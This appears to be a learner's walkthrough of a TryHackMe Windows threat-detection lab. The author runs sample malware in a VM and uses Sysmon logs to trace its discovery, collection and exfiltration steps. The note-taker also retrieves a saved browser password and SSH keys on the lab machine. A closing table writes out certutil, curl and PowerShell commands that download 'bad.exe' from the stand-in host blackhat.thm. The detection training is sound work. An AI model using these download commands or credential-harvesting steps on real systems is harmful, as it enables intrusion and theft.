# **Windows Threat Detection 2**

## **Discovery Process:**

1. To check which privileged group the user belongs to?
    
    I opened the Command Prompt and ran the `net user Administrator`
    
    ![image.png](image%2012.png)
    
2. To find out what the "Image" field of the net command is:
    
    I opened the Sysmon logs and applied the filter with event ID 1.
    
    **Sysmon Log path**: `Applications and Services Logs section. Look for ‘Microsoft’ > ‘Windows’ > ‘Sysmon’ > ‘Operational’.`
    
    ![image.png](image%2013.png)
    

## **Detecting Discovery:**

 A phishing attachment sample is located at: **`C:\Users\Administrator\Desktop\Practice\Task 3\invoice.pdf.exe`**

I executed the `invoice.pdf.exe` file.

1. To find what the first command the `invoice.pdf.exe` executes:
    
    I filtered the logs by event ID 1 and checked the logs after the file was executed.
    
    ![image.png](image%2014.png)
    
2. To check which command the malware used to check the presence of MS Defender EDR:
    
    I checked all logs one by one, created after the execution of the file.
    
    ![image.png](image%2015.png)
    
3. To find out to which domain the malware sends the discovered data:
    
    I apply filter 22 and check the log.
    
    ![image.png](image%2016.png)
    

## **Exfiltrating Data:**

1. To find out what the Facebook password is that the user saved in Chrome:
    
    I opened Chrome and went to Settings> Autofill and passwords.
    
    ![image.png](image%2017.png)
    
2. To find out which SSH key the user stores on disk:
    
    I went to the `C:\Users\Administrator\`
    
    And got the SSH private and public keys.
    
    ![image.png](image%2018.png)
    
3. To find out what the secret PDF file explains about `TryHackMe's` internal network:
    
    I looked at the Desktop, Downloads, and Documents folders.
    
    I got the file in the Downloads folder.
    
    ![image.png](image%2019.png)
    

## **Detecting Collection:**

A simple data stealer sample is at: **`C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe`**

I ran the file in a VM.

1. To find which directory the stealer creates:
    
    I checked the logs one by one and got the directory name.
    
    ![image.png](image%2020.png)
    
2. To find which three file extensions the malware searches for:
    
    I continued to check the logs one by one, and I got it. The extensions are **`.docx, .pdf and .xlsx`** 
    
    ![image.png](image%2021.png)
    
    ![image.png](image%2022.png)
    
    ![image.png](image%2023.png)
    
3. To find out which PowerShell cmdlet the malware uses to get clipboard content:
    
    I already got this log while analysing the extensions.
    
    ![image.png](image%2024.png)
    
4. To find out which domain the malware exfiltrates the data to:
    
    I applied filter 22 to see only logs related to DNS queries.
    
    ![image.png](image%2025.png)
    

## **Ingress Tool Transfer:**

**Common Transfer Methods:**

| **Ingress Tool Transfer Command** | **Common CMD / PowerShell Commands** |
| --- | --- |
| Via Certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| Via Curl (Windows 10+) | `curl.exe https://blackhat.thm/bad.exe -o good.exe` |
| Via PowerShell [IWR(opens in new tab)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Via Graphical Interface | No need to use CMD, just copy-paste malware via RDP or download them via a web browser! |

---
